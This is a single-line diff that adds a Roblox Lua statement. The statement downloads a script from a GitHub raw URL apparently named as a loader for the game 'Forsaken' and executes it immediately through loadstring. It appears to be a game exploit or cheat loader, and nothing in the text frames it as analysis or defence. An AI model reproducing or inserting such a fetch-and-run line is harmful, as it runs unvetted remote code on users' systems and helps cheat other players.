@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/upd-forsaken-spam3-rb86r8cmf7ixpw.lua"))()
